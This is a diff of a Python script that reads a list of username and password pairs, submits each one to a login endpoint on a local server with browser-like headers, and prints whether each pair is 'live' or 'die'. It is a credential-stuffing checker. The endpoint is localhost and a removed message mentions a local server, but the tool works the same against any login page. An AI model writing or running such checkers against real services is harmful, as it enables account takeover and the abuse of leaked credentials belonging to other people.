@@ -11,37 +11,25 @@ except Exception:
 
 f = open(db, 'r').readlines()
 
-url = "http://127.0.0.1:5000/auth/rok"
+for i in range(len(f)):
+    username = f[i].split()[0].split(dl)[0]
+    password = f[i].split()[0].split(dl)[1]
 
-headers = {
-    "accept": "application/json, text/plain, */*",
-    "content-type": "application/json",
-    "origin": "http://127.0.0.1:5000",
-    "referer": "http://127.0.0.1:5000/",
-    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
-}
+    url = "http://127.0.0.1:5000/auth/rok"
 
-for line in f:
-    line = line.strip()
-    if not line:
-        continue
-
-    parts = line.split(dl)
-    if len(parts) < 2:
-        continue
-
-    username = parts[0]
-    password = parts[1]
+    headers = {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "origin": "http://127.0.0.1:5000",
+        "referer": "http://127.0.0.1:5000/",
+        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
+    }
 
     data = json.dumps({"username": username, "password": password})
 
-    try:
-        r = requests.post(url, headers=headers, data=data, allow_redirects=False, timeout=5)
+    r = requests.post(url, headers=headers, data=data, allow_redirects=False)
 
-        if r.status_code == 200:
-            print(f"[LIVE] {username}:{password}")
-        else:
-            print(f"[DIE]  {username}:{password}")
-    except requests.exceptions.ConnectionError:
-        print("[ERRO] Servidor não está rodando. Execute: python server.py")
-        break
+    if r.status_code == 200:
+        print(f"live {username}|{password}")
+    else:
+        print(f"die {username}|{password}")
